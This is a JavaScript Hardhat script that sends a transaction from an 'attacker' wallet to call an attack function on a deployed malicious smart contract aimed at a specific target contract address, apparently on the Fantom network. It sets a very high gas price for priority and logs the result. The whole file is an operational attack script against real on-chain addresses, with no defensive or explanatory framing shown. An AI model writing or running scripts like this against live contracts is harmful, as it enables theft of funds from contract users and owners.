require("dotenv").config();
const { ethers } = require("hardhat");

async function main() {
    // Set up the provider and attacker's wallet
    const provider = new ethers.providers.JsonRpcProvider(process.env.FANTOM_RPC_URL);
    const attacker = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    console.log("Configured attacker address:", attacker.address);

    // Updated addresses of the malicious contract and the target vulnerable contract
    const maliciousContractAddress = "0x19871F92733E0Dd22898dF0935Ad315B71afC6E8"; // Updated MaliciousContract address
    const targetContractAddress = "0x5456070082e58Fa63F0aDacB5f4527da25BD7454"; // Target contract address

    // Define the ABI for MaliciousContract's attack function
    const MaliciousContract = new ethers.Contract(
        maliciousContractAddress,
        [
            "function attack(uint256 _amount) external",
            "event AttackExecuted(uint256 amount)",
            "event BalanceBeforeAttack(uint256 balance)"
        ],
        attacker
    );

    console.log("Attempting to execute attack on target contract:", targetContractAddress);

    try {
        console.log("Executing attack...");

        // Set an amount to initiate the attack (adjust based on expected behavior)
        const attackAmount = ethers.utils.parseEther("1"); // Example: 1 ETH

        // Set a high gas price for prioritization
        const gasPrice = ethers.utils.parseUnits('1000', 'gwei');

        // Call the attack function with the specified gas limit and high gas price
        const tx = await MaliciousContract.attack(attackAmount, {
            gasLimit: 5000000,  // Adjust as necessary
            gasPrice: gasPrice
        });

        const receipt = await tx.wait();
        
        console.log("Attack executed successfully!");
        console.log("Transaction hash:", receipt.transactionHash);
        console.log("Gas used:", receipt.gasUsed.toString());

    } catch (error) {
        console.error("Error during attack execution:", error.message);
    }
}

main()
    .then(() => console.log("Attack script completed"))
    .catch(console.error);
